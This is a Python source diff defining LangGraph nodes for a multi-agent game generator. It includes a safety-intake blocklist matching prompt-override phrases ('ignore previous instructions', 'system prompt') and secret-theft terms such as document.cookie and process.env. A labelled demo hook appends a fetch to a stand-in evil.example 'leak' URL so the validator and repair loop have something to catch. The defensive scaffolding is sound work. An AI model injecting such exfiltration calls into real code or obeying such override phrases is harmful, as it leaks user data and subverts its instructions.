@@ -1,0 +1,310 @@
+"""9 个 LangGraph 节点 + 条件边（docs/multi-agent_design.md §6, §7.1）。
+
+- 确定性节点：safety_intake / asset_processing / build_validation / publish_artifact
+- 计划节点（real 调模型 / mock 启发式）：intent_spec / game_design / replan_game_design
+- 执行节点：code_generation / repair_code（模板渲染）
+每个节点返回状态更新 + 展示字段（_agent / _logs / _tokens_delta），由 pipeline 流式落库。
+
+Demo 钩子：prompt 含 "force-repair" / "force-replan" 时，code 阶段注入一个禁用 API，
+用于离线演示 bounded repair / constrained replan 两个循环（清晰标注，仅供验收观察）。
+"""
+import json
+import re
+
+from app.agents import bundles, llm, prompts, templating, validation
+from app.agents.state import MAX_REPAIR, MAX_REPLAN
+from app.storage import s3
+
+_BLOCKED = [
+    r"ignore (previous|all) (instructions|prompts)",
+    r"system prompt",
+    r"document\.cookie",
+    r"process\.env",
+    r"\bexfiltrate\b",
+    r"steal .*(key|password|secret|token)",
+    r"reveal .*(key|secret|prompt)",
+]
+_THEMES = ["space", "neon", "candy", "forest", "retro", "ocean"]
+_THEME_COVER = {
+    "space": "linear-gradient(135deg,#0ea5b7,#4f46e5)",
+    "neon": "linear-gradient(135deg,#7c5cff,#c026d3)",
+    "candy": "linear-gradient(135deg,#ff6b9d,#ff3ea5)",
+    "forest": "linear-gradient(135deg,#10b981,#065f46)",
+    "retro": "linear-gradient(135deg,#ff8a3d,#ff3ea5)",
+    "ocean": "linear-gradient(135deg,#0ea5b7,#2563eb)",
+}
+
+
+# ---------- helpers ----------
+def _parse_json(raw: str) -> dict:
+    m = re.search(r"\{.*\}", raw or "", re.S)
+    if not m:
+        return {}
+    try:
+        return json.loads(m.group(0))
+    except Exception:
+        return {}
+
+
+def _theme_cover(theme) -> str:
+    return _THEME_COVER.get(str(theme or "").lower(), _THEME_COVER["retro"])
+
+
+def _heuristic_spec(prompt: str) -> dict:
+    p = prompt.lower()
+    theme = next((t for t in _THEMES if t in p), "retro")
+    return {
+        "title": bundles.title_from(prompt),
+        "summary": (prompt[:118] + "…") if len(prompt) > 120 else prompt,
+        "genre": "arcade",
+        "theme": theme,
+        "target_runtime": "canvas",
+        "core_loop": "move to dodge hazards and collect stars",
+        "controls": {"keyboard": ["ArrowLeft", "ArrowRight"], "pointer": ["move"],
+                     "hint": "move the mouse / arrow keys — dodge red, catch the stars"},
+        "win_condition": "survive_time",
+        "lose_condition": "hit_hazard",
+        "score_rule": "collect_star_plus_10",
+        "difficulty_curve": "hazard rate increases gradually",
+        "visual_style": theme,
+        "tags": [theme, "arcade", "casual"],
+    }
+
+
+def _coerce_spec(data: dict, prompt: str) -> dict:
+    base = _heuristic_spec(prompt)
+    if isinstance(data, dict):
+        for k in ("title", "summary", "genre", "theme", "core_loop", "win_condition",
+                  "lose_condition", "score_rule", "difficulty_curve", "visual_style"):
+            if data.get(k):
+                base[k] = str(data[k])[:200]
+        if isinstance(data.get("tags"), list) and data["tags"]:
+            base["tags"] = [str(t)[:30] for t in data["tags"]][:5]
+        if isinstance(data.get("controls"), dict):
+            base["controls"].update(data["controls"])
+    return base
+
+
+def _heuristic_design(spec: dict) -> dict:
+    return {
+        "screen": {"width": 800, "height": 600},
+        "entities": [
+            {"name": "player", "type": "sprite", "movement": "horizontal"},
+            {"name": "hazard", "type": "obstacle", "spawn": "top_random"},
+            {"name": "star", "type": "collectible", "spawn": "top_random"},
+        ],
+        "rules": {"collision_player_hazard": "game_over", "collision_player_star": "score_plus_10",
+                  "survive_seconds": 45},
+        "ui": {"show_score": True, "show_timer": True, "show_restart_button": True},
+    }
+
+
+def _coerce_design(data: dict) -> dict:
+    base = _heuristic_design({})
+    if isinstance(data, dict):
+        if isinstance(data.get("screen"), dict):
+            base["screen"].update(data["screen"])
+        if isinstance(data.get("entities"), list) and data["entities"]:
+            base["entities"] = data["entities"][:8]
+        if isinstance(data.get("rules"), dict):
+            base["rules"].update(data["rules"])
+        if isinstance(data.get("ui"), dict):
+            base["ui"].update(data["ui"])
+    return base
+
+
+def _simplify_design(design: dict) -> dict:
+    d = _heuristic_design({})
+    d["rules"]["survive_seconds"] = 30
+    return d
+
+
+def _should_inject(state: dict) -> bool:
+    """Demo 钩子：决定是否注入禁用 API 以触发 repair / replan 循环。"""
+    p = (state.get("normalized_prompt") or state.get("prompt") or "").lower()
+    if "force-replan" in p:
+        return state.get("replan_attempts", 0) == 0
+    if "force-repair" in p:
+        return state.get("repair_attempts", 0) == 0
+    return False
+
+
+def _render_code(state: dict) -> list[dict]:
+    spec = state.get("game_spec") or {}
+    design = state.get("game_design") or {}
+    tname = templating.select_template(spec, design)
+    cfg = templating.build_config(spec, design, state.get("asset_manifest") or {})
+    files = templating.render_files(tname, cfg)
+    if _should_inject(state):
+        for f in files:
+            if f["path"] == "game.js":
+                f["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
+    return files
+
+
+# ---------- nodes ----------
+def safety_intake_node(state: dict) -> dict:
+    p = state.get("prompt", "") or ""
+    if not p.strip():
+        return {"status": "failed", "error_code": "EMPTY_PROMPT", "error_message": "Prompt cannot be empty",
+                "_agent": "SafetyIntakeAgent", "_logs": ["prompt is empty -> rejected"]}
+    if len(p) > 2000:
+        return {"status": "failed", "error_code": "PROMPT_TOO_LONG", "error_message": "Prompt too long (>2000 chars)",
+                "_agent": "SafetyIntakeAgent", "_logs": ["prompt exceeds 2000 chars -> rejected"]}
+    for pat in _BLOCKED:
+        if re.search(pat, p, re.IGNORECASE):
+            return {"status": "failed", "error_code": "SAFETY_REJECTED",
+                    "error_message": "Prompt rejected by safety rule",
+                    "_agent": "SafetyIntakeAgent", "_logs": [f"blocked pattern matched ({pat}) -> rejected"]}
+    n = len(state.get("asset_ids") or [])
+    return {
+        "normalized_prompt": p.strip(),
+        "safety_result": {"passed": True, "risk_level": "low"},
+        "_agent": "SafetyIntakeAgent",
+        "_logs": [f"prompt accepted ({len(p)} chars)", f"{n} asset(s) accepted", "injection scan ✓ passed"],
+    }
+
+
+def intent_spec_node(state: dict) -> dict:
+    prompt = state.get("normalized_prompt") or state.get("prompt", "")
+    if state.get("use_real"):
+        try:
+            raw, tk = llm.chat(prompts.INTENT_SPEC_SYSTEM_PROMPT,
+                               prompts.build_intent_spec_prompt(prompt, len(state.get("asset_ids") or [])))
+            spec = _coerce_spec(_parse_json(raw), prompt)
+            return {"game_spec": spec, "_agent": "IntentSpecAgent", "_tokens_delta": tk,
+                    "_logs": ["calling model -> GameSpec JSON", f"spec: {spec['genre']} · {spec['title']}"]}
+        except Exception as exc:  # noqa: BLE001
+            spec = _heuristic_spec(prompt)
+            return {"game_spec": spec, "_agent": "IntentSpecAgent",
+                    "_logs": [f"model failed ({exc}); fell back to heuristic spec", f"spec: {spec['title']}"]}
+    spec = _heuristic_spec(prompt)
+    return {"game_spec": spec, "_agent": "IntentSpecAgent",
+            "_logs": ["building GameSpec (offline heuristic)", f"spec: {spec['genre']} · {spec['title']}"]}
+
+
+def asset_processing_node(state: dict) -> dict:
+    from app.db.session import SessionLocal
+    from app.models import Asset
+
+    ids = state.get("asset_ids") or []
+    uploaded = []
+    if ids:
+        db = SessionLocal()
+        try:
+            for a in db.query(Asset).filter(Asset.id.in_(ids)).all():
+                uploaded.append({"id": a.id, "key": a.filename, "type": a.kind,
+                                 "url": s3.public_url(a.oss_key), "source": "uploaded"})
+        finally:
+            db.close()
+    spec = state.get("game_spec") or {}
+    asset_manifest = {"cover": _theme_cover(spec.get("theme")), "assets": uploaded}
+    return {"uploaded_assets": uploaded, "asset_manifest": asset_manifest, "_agent": "AssetAgent",
+            "_logs": [f"loaded {len(uploaded)} uploaded asset(s)", "default cover prepared", "asset_manifest ready"]}
+
+
+def game_design_node(state: dict) -> dict:
+    spec = state.get("game_spec") or {}
+    if state.get("use_real"):
+        try:
+            raw, tk = llm.chat(prompts.GAME_DESIGN_SYSTEM_PROMPT,
+                               prompts.build_game_design_prompt(spec, state.get("asset_manifest")))
+            design = _coerce_design(_parse_json(raw))
+            ents = ", ".join(str(e.get("name", "?")) for e in design.get("entities", []))
+            return {"game_design": design, "_agent": "GameDesignAgent", "_tokens_delta": tk,
+                    "_logs": ["calling model -> GameDesign JSON", f"entities: {ents}"]}
+        except Exception as exc:  # noqa: BLE001
+            design = _heuristic_design(spec)
+            return {"game_design": design, "_agent": "GameDesignAgent",
+                    "_logs": [f"model failed ({exc}); heuristic design", "entities: player, hazard, star"]}
+    design = _heuristic_design(spec)
+    return {"game_design": design, "_agent": "GameDesignAgent",
+            "_logs": ["building GameDesign (offline heuristic)", "entities: player, hazard, star",
+                      f"rules: survive {design['rules']['survive_seconds']}s + collect"]}
+
+
+def code_generation_node(state: dict) -> dict:
+    files = _render_code(state)
+    tname = templating.select_template(state.get("game_spec"), state.get("game_design"))
+    logs = [f"selected template: {tname}", "rendered index.html / style.css / game.js from config"]
+    if _should_inject(state):
+        logs.append("[demo] injected forbidden API to trigger repair loop")
+    return {"generated_files": files, "_agent": "GameCodeAgent", "_logs": logs}
+
+
+def build_validation_node(state: dict) -> dict:
+    result = validation.validate_files(state.get("generated_files") or [])
+    if result["valid"]:
+        return {"validation_result": result, "_agent": "BuildValidateAgent",
+                "_logs": ["file whitelist ✓", "forbidden-API scan ✓", "manifest/refs ✓", "validation passed"]}
+    return {"validation_result": result, "last_error": "; ".join(result["errors"]),
+            "_agent": "BuildValidateAgent", "_logs": ["validation FAILED:"] + result["errors"][:4]}
+
+
+def repair_code_node(state: dict) -> dict:
+    attempts = state.get("repair_attempts", 0) + 1
+    files = _render_code({**state, "repair_attempts": attempts})
+    return {"generated_files": files, "repair_attempts": attempts, "_agent": "GameCodeAgentRepair",
+            "_logs": [f"repair attempt #{attempts}: re-rendered from template",
+                      "removed offending code; back to validation"]}
+
+
+def replan_game_design_node(state: dict) -> dict:
+    attempts = state.get("replan_attempts", 0) + 1
+    extra = {}
+    if state.get("use_real"):
+        try:
+            raw, tk = llm.chat(prompts.REPLAN_SYSTEM_PROMPT,
+                               prompts.build_replan_prompt(state.get("game_spec"), state.get("game_design"),
+                                                           state.get("last_error")))
+            design = _coerce_design(_parse_json(raw))
+            extra = {"_tokens_delta": tk}
+        except Exception:  # noqa: BLE001
+            design = _simplify_design(state.get("game_design"))
+    else:
+        design = _simplify_design(state.get("game_design"))
+    return {
+        "game_design": design, "generated_files": [], "validation_result": {},
+        "repair_attempts": 0, "replan_attempts": attempts, "last_error": None,
+        "_agent": "GameDesignAgentReplan",
+        "_logs": [f"replan #{attempts}: simplified design to fit runtime", "reset repair; back to code generation"],
+        **extra,
+    }
+
+
+def publish_artifact_node(state: dict) -> dict:
+    from app.services import packaging
+
+    game_id, version_id, manifest_url = packaging.publish_generated(state)
+    return {
+        "status": "succeeded", "game_id": game_id, "version_id": version_id,
+        "manifest_url": manifest_url, "preview_url": f"/play/{game_id}",
+        "_agent": "PublishArtifactAgent",
+        "_logs": ["PUT index.html / style.css / game.js -> object storage",
+                  "PUT manifest.json (game-manifest/v1) · sha256 stamped",
+                  "INSERT game + game_version -> status=preview ✓"],
+    }
+
+
+def failed_node(state: dict) -> dict:
+    msg = state.get("error_message") or state.get("last_error") or "generation failed"
+    return {"status": "failed", "error_message": msg, "_agent": "FailureHandler", "_logs": [f"task failed: {msg}"]}
+
+
+def done_node(state: dict) -> dict:
+    return {"status": "succeeded", "_agent": "DoneHandler", "_logs": ["generation succeeded ✓"]}
+
+
+# ---------- 条件边（§7.1）----------
+def should_continue_after_safety(state: dict) -> str:
+    return "failed" if state.get("status") == "failed" else "intent_spec"
+
+
+def should_continue_after_validation(state: dict) -> str:
+    if (state.get("validation_result") or {}).get("valid"):
+        return "publish_artifact"
+    if state.get("repair_attempts", 0) < MAX_REPAIR:
+        return "repair_code"
+    if state.get("replan_attempts", 0) < MAX_REPLAN:
+        return "replan_game_design"
+    return "failed"
